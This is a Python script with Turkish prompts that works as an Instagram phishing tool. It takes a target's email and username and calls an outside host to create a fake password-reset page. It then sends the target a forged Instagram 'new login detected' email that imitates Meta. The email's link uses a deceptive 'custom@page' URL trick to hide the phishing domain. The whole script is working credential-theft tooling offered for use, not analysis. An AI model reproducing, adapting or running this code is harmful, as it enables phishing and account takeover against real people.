import requests, os, json, sys, time
from colorama import Fore, Style

# Gerekli modülleri indir
os.system("clear")
os.system("chmod +x main.py")
os.system("pip install requests")
os.system("clear")

# İkinci animasyon
def loading_animation():
    symbols = ["-", "|", "/", "\\"]
    for i in range(1, 16):
        sys.stdout.write('\r')
        sys.stdout.write('-' * i + symbols[i % len(symbols)])
        sys.stdout.flush()
        time.sleep(0.2)

# İlk animasyon
def renkli_animasyon():
    symbols = [Fore.RED + "█" + Fore.RESET, Fore.YELLOW + "█" + Fore.RESET, Fore.GREEN + "█" + Fore.RESET, Fore.BLUE + "█" + Fore.RESET]
    
    for i in range(1, 41):
        sys.stdout.write('\r')
        sys.stdout.write(''.join([symbols[(i + j) % len(symbols)] for j in range(40)]))
        sys.stdout.flush()
        time.sleep(0.2)

# Animasyonu silip sadece ferit yazısını ekrana yazdırma
def temizle_ve_yazdir(text):
    print('\033[K' + text, end='')
    sys.stdout.flush()

text = """
            ███████╗███████╗██████╗ ██╗████████╗
            ██╔════╝██╔════╝██╔══██╗██║╚══██╔══╝
            █████╗  █████╗  ██████╔╝██║   ██║   
            ██╔══╝  ██╔══╝  ██╔══██╗██║   ██║   
            ██║     ███████╗██║  ██║██║   ██║   
            ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
"""

renkli_text = (
    Fore.RED + text.replace("█", Fore.YELLOW + "█" + Fore.RED) +
    Style.RESET_ALL
)

print(renkli_text) # Animasyonlu yazı
renkli_animasyon() # Animasyonlu yazıyı yap ve bitir
os.system("clear") # Animasyonlu yazıyı bitirdikten sonra ekranı temizle
temizle_ve_yazdir(renkli_text) # Ekrana sadece ferit yazdırma

print(f"""
{Fore.GREEN}1--->Instagram{Style.RESET_ALL}
{Fore.RED}0--->Exit{Style.RESET_ALL}
""")
print(f"{Fore.MAGENTA}MORE is COMING SOON...{Style.RESET_ALL}")

seçim = input(f"{Fore.CYAN}Seçiminiz--->{Style.RESET_ALL}")

if seçim == "0":
    print(f"{Fore.RED}Çıkış Yapıldı{Style.RESET_ALL}")
else:
    if seçim == "1":
        # Kullanıcıdan mail al
        mail = input(f"{Fore.GREEN}Mail Adresiniz--->{Style.RESET_ALL}")

        # Kullanıcıdan Hedef Kullanıcının mail adresini al
        to = input(f"{Fore.GREEN}Hedef Kullanıcının Maili (boş bırakmak için enter'a basın)--->{Style.RESET_ALL}")
        kullanicismi = input(f"{Fore.GREEN}Hedef Kullanıcının İnstagram İsmi--->{Style.RESET_ALL}")

        # Eğer to boş değilse mail gönderme apisi kullan
           
        # Mail gönderme apisi kullanılmazsa devam et
        ozelurl = input(f"{Fore.GREEN}Özel Url (instagram-com gibi)--->{Style.RESET_ALL}")
        
        os.system("clear")
        print("\033[32m|")
        loading_animation() # İlk animasyon

        api_url_sayfa = "http://smmslowy-001-site1.atempurl.com/api/newpages.php"
        params_sayfa = {"mail": mail, "userss": kullanicismi}

        response_sayfa = requests.get(api_url_sayfa, params=params_sayfa)

        if response_sayfa.status_code == 200:
            print("""
            ███████╗███████╗██████╗ ██╗████████╗
            ██╔════╝██╔════╝██╔══██╗██║╚══██╔══╝
            █████╗  █████╗  ██████╔╝██║   ██║   
            ██╔══╝  ██╔══╝  ██╔══██╗██║   ██║   
            ██║     ███████╗██║  ██║██║   ██║   
            ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
                                                
            """)
            
            sayfa = f"socials.con.tc/resetpassword/{kullanicismi}.php"
            
            if to:
                api_url_mail = "http://smmslowy-001-site1.atempurl.com/mail/mail.php"

                data_mail = {
                    'to': to,
                    'subject': "İnstagram Hesabınıza Yeni Giriş Tespit Edildi!",
                    'body': f'''
		
 
Yeni Bir Giriş Yapıldığını Fark Ettik, {kullanicismi}
 
Genellikle kullanmadığınız bir cihazdan giriş yapıldığını fark ettik.
 
 

 
POCO X3 PRO · Instagram · Istanbul, Turkey
 
 
Bu kişi sizseniz, birkaç gün boyunca belirli güvenlik ve hesap ayarlarına erişemeyeceksiniz. Bu ayarlara daha önce giriş yaptığınız bir cihazdan yine erişebilirsiniz.
 
Bu kişi siz değilseniz, Hesabınızı Kurtarmak İçin! 

Hesabınızı Kurtarmak İçin: https://{ozelurl}@{sayfa}
   

© Inqtagram. Meto Platforms, Inc., 1701 Willow Road, Menlo Park, CA 94025
Bu mesaj {to} adresine {kullanicismi} için gönderilmiştir. Bu sizin hesabınız değil mi? Bu hesaptan e-posta adresinizi kaldırın.
                '''
                }

                headers_mail = {'Content-Type': 'application/json'}

                response_mail = requests.post(api_url_mail, data=json.dumps(data_mail), headers=headers_mail)
            
                print(f"\033[31m\nUrl: https://{ozelurl}@{sayfa}")
        else:
            print(f"Hata! HTTP durumu: {response_sayfa.status_code}")
            print("API yanıtı:", response_sayfa.text)
    else:
        print(f"{Fore.RED}Geçersiz seçim. Lütfen 1'i seçin.{Style.RESET_ALL}")

    print("Programı sonlandırmak için 'e' tuşuna basın.")
    kapat_secimi = input("Seçiminiz--->")

    if kapat_secimi.lower() == "e":
        print(f"{Fore.RED}Program kapatılıyor...{Style.RESET_ALL}")
        sys.exit(0)
    else:
        print("Program devam ediyor.")
